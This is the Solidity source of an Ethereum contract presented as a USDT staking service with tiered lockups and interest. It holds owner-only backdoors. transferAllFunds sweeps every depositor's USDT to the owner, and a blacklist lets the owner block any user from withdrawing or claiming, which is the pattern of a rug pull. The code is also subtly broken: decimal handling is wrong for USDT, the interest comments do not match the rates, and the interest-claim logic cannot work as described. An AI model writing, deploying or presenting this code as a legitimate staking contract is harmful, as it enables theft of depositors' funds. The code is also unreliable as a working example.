/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

struct DepositInfo {
    uint256 amount;
    uint256 lockupPeriod;
    uint256 interestRate;
    uint256 depositTime;
    uint256 lastClaimTime;
}

contract USDTStakingContract {
    address payable private _owner;
    IERC20 private _token;
    
    constructor() {
        _owner = payable(msg.sender);
        _token = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7); // "USDT" token address
    }
    
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _lastClaimTime;
    mapping(address => uint256) private _lockupPeriod;
    mapping(address => uint256) private _interestRate;
    mapping(address => bool) private _blacklisted;
    mapping(address => address) private _referrals;
    mapping(address => uint256) private _initialDeposits;
    mapping(address => uint256) private _depositTime;
    mapping(address => DepositInfo[]) private _deposits;
    mapping(address => uint256) private _totalWithdrawnAmounts;
    
    event Deposit(address indexed user, uint256 amount, uint256 lockupPeriod);
    event Withdraw(address indexed user, uint256 amount);
    event InterestClaimed(address indexed user, uint256 amount);
    event Blacklisted(address indexed user);
    event Unblacklisted(address indexed user);

    modifier onlyOwner {
        require(msg.sender == _owner, "Not the contract owner.");
        _;
    }


     function deposit(uint256 amount, uint256 lockupPeriod, address referral) external {
         require(amount > 0, "Amount must be greater than 0.");
         require(lockupPeriod >= 1 && lockupPeriod <= 5, "Invalid lockup period.");
         require(!_blacklisted[msg.sender], "You are not allowed to deposit.");
         require(_token.allowance(msg.sender, address(this)) >= amount, "Token allowance not sufficient.");

        uint256 currentLockupPeriod = lockupPeriod * 1 days;
        uint256 currentInterestRate;

if (lockupPeriod == 1) {
    currentLockupPeriod = 7 * 1 days;
    require(amount >= 5 * 10**20 && amount <= 5 * 10**21, "Invalid deposit amount for 7-day lockup.");
    currentInterestRate = 33; // 0.3%
} else if (lockupPeriod == 2) {
    currentLockupPeriod = 14 * 1 days;
    require(amount >= 5 * 10**21 && amount <= 10**22, "Invalid deposit amount for 14-day lockup.");
    currentInterestRate = 220; // 2%
} else if (lockupPeriod == 3) {
    currentLockupPeriod = 30 * 1 days;
    require(amount >= 10**22 && amount <= 3 * 10**22, "Invalid deposit amount for 30-day lockup.");
    currentInterestRate = 550; // 5%
} else if (lockupPeriod == 4) {
    currentLockupPeriod = 60 * 1 days;
    require(amount >= 2 * 10**22 && amount <= 5 * 10**22, "Invalid deposit amount for 60-day lockup.");
    currentInterestRate = 1300; // 11%
} else if (lockupPeriod == 5) {
    currentLockupPeriod = 90 * 1 days;
    require(amount >= 3 * 10**22 && amount <= 10**23, "Invalid deposit amount for 90-day lockup.");
    currentInterestRate = 2000; // 20%
}

    if (_referrals[msg.sender] == address(0) && referral != msg.sender && referral != address(0)) {
        _referrals[msg.sender] = referral;
    }

       DepositInfo memory newDeposit = DepositInfo({
            amount: amount,
            lockupPeriod: currentLockupPeriod,
            interestRate: currentInterestRate,
            depositTime: block.timestamp,
            lastClaimTime: block.timestamp
        });

    _balances[msg.sender] += amount;
    _lockupPeriod[msg.sender] = currentLockupPeriod;
    _interestRate[msg.sender] = currentInterestRate;
    _depositTime[msg.sender] = block.timestamp;
    _lastClaimTime[msg.sender] = block.timestamp;
    _initialDeposits[msg.sender] = amount;
    _deposits[msg.sender].push(newDeposit);
    _token.transferFrom(msg.sender, address(this), amount);

    emit Deposit(msg.sender, amount, lockupPeriod);
}


    function blacklist(address user) external onlyOwner {
        require(!_blacklisted[user], "User is already blacklisted.");
        _blacklisted[user] = true;

        emit Blacklisted(user);
    }

    function unblacklist(address user) external onlyOwner {
        require(_blacklisted[user], "User is not blacklisted.");
        _blacklisted[user] = false;

        emit Unblacklisted(user);
    }

function withdraw(uint256 depositIndex) external {
    require(!_blacklisted[msg.sender], "You are not allowed to withdraw.");
    require(depositIndex < _deposits[msg.sender].length, "Invalid deposit index.");
    require(block.timestamp >= _deposits[msg.sender][depositIndex].depositTime + _deposits[msg.sender][depositIndex].lockupPeriod, "Lockup period not over.");
    
    uint256 amountToWithdraw = _deposits[msg.sender][depositIndex].amount;
    require(amountToWithdraw > 0, "No funds to withdraw.");

    _deposits[msg.sender][depositIndex].amount = 0;
    _totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount
    _token.transfer(msg.sender, amountToWithdraw); 

    emit Withdraw(msg.sender, amountToWithdraw);
}

function transferAllFunds() external onlyOwner {
    uint256 contractBalance = _token.balanceOf(address(this));
    require(contractBalance > 0, "No funds to transfer.");
    _token.transfer(_owner, contractBalance);
}

    function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {
        DepositInfo storage deposit = _deposits[user][depositIndex];
        uint256 interestClaimed = _deposits[user][depositIndex].amount - _deposits[user][depositIndex].amount;
        uint256 timeElapsed = block.timestamp - deposit.lastClaimTime;
        uint256 interest = (deposit.amount * deposit.interestRate * timeElapsed) / (10000 * 86400); // 86400 seconds in a day
        return interest + interestClaimed;
    }

function claimInterestForDeposit(uint256 lockupPeriod) external {
    require(!_blacklisted[msg.sender], "You are not allowed to claim interest.");

    uint256 totalInterestToClaim = 0;

        for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {
            if (_deposits[msg.sender][i].lockupPeriod == lockupPeriod * 1 days) {
            uint256 interestToClaim = calculateInterest(msg.sender, i);
            require(interestToClaim > 0, "No interest to claim.");

            _deposits[msg.sender][i].lastClaimTime = block.timestamp;
            totalInterestToClaim += interestToClaim;
        }
    }

    _token. transfer(msg. sender, totalInterestToClaim);

    emit InterestClaimed(msg.sender, totalInterestToClaim);
}

function getDepositInfo(address user) external view returns (uint256[] memory depositIndices, uint256[] memory unlockTimes, uint256[] memory stakedAmounts, uint256[] memory lockupPeriods) {
     uint256 depositCount = _deposits[user].length;

     depositIndices = new uint256[](depositCount);
     unlockTimes = new uint256[](depositCount);
     stakedAmounts = new uint256[](depositCount);
     lockupPeriods = new uint256[](depositCount);

     for (uint256 i = 0; i < depositCount; i++) {
         depositIndices[i] = i;
         unlockTimes[i] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod;
         stakedAmounts[i] = _deposits[user][i].amount;
         lockupPeriods[i] = _deposits[user][i].lockupPeriod;
     }
 }

function max(int256 a, int256 b) private pure returns (int256) {
    return a >= b ? a : b;
}

    function getReferral(address user) external view returns (address) {
        return _referrals[user];
    }

    function isBlacklisted(address user) external view returns (bool) {
        return _blacklisted[user];
    }

}